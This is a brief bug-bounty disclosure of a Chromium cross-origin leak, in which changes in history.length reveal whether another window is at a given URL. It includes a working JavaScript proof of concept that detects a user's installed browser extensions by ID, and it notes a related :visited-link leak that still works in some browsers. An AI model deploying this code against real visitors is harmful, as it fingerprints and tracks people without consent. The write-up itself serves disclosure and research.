---
title: Cross-origin URL detection via "history.length" (Awarded $5000)
---

Same URL navigations don't normally increase history.length, So by checking if it increases this allows the opener to check the exact URL of a window.
This was fixed in Chromium for a cross-origin initiator if there's no error, there are currently timing attacks with same document navigations however. <https://chromium-review.googlesource.com/c/chromium/src/+/2983325>

```js
async function isLocation(w, url) {
    w.location = "about:blank";
    await new Promise(resolve => setTimeout(resolve, 500));
    let start = w.history.length;
    w.history.back();
    await new Promise(resolve => setTimeout(resolve, 500));
    w.location = url;
    await new Promise(resolve => setTimeout(resolve, 500));
    w.location = "about:blank";
    await new Promise(resolve => setTimeout(resolve, 500));
    let diff = w.history.length - start;
    w.history.go(-1 - diff);
    return (diff === 0);
}

// Invalid extension IDs get set to "chrome-extension://invalid/"
async function hasExtension(id) {
    let w = open("chrome-extension://" + encodeURIComponent(id));
    await new Promise(resolve => setTimeout(resolve, 500));
    let state = await isLocation(w, "chrome-extension://invalid/");
    w.close();
    return !state;
}

await hasExtension("aohghmighlieiainnegkcijnfilokakq"); // return true/false
```

Also [40087397 - Eliminate :visited privacy issues once and for all - chromium](https://issues.chromium.org/issues/40087397) still works for some browsers except chromium <https://developer.chrome.com/blog/visited-links>
